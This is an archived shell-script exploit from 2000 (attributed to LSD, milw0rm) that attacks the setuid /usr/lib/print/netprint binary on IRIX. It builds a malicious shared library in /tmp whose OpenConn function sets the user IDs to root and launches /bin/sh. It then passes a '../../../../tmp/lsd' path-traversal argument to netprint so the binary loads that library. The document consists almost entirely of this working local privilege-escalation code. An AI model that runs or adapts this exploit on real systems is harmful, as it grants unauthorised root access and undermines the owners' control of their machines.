#!/bin/sh
## copyright LAST STAGE OF DELIRIUM jul 2000 poland            *://lsd-pl.net/ #
## /usr/lib/print/netprint                                                     #
##                                                                             #
## This code gets released due to another post to the Bugtraq mailing list.    #
## For IRIX 6.3 and above this privilage escalation attack can be conducted    #
## by local lp users only.                                                     #

EXECUTABLE=/usr/lib/print/netprint
LIBRARY=lsd
DIRECTORY=/tmp

cd $DIRECTORY
cat > $LIBRARY.c << 'EOF'
OpenConn(){
    printf("copyright LAST STAGE OF DELIRIUM jul 2000 poland  //lsd-pl.net/\n");
    printf("/usr/lib/print/netprint for irix 5.3 6.2 6.3 6.4 6.5 6.5.11 IP:all\n");
    printf("\n");
    setreuid(getuid(),0);setuid(0);setgid(0);
    execl("/bin/sh","sh",0);
}
CloseConn(){} ListPrinters(){} SendJob(){} CancelJob(){} WaitForJob(){}
GetQueue(){} StartTagging(){} StopTagging(){} Install(){} AddTimeout(){}
RemoveSemiColons(){} ListAllPrinters(){} CreateInterface(){} InstallPrinter(){}
InstallIcon(){} SockRead(){} IsDest(){} BSDSendJob(){}
EOF
cc -c $LIBRARY.c  -o $LIBRARY.o
ld -shared $LIBRARY.o -o $LIBRARY.so
rm -rf $LIBRARY.[co] so_locations
if [ ! -f "$LIBRARY.so" ]
    then
    echo "error: building library"
    exit 1
fi
chmod 666 $LIBRARY.so

$EXECUTABLE -n ../../../../$DIRECTORY/$LIBRARY -h localhost -p lalala bzz-zz


# milw0rm.com [2001-05-08]
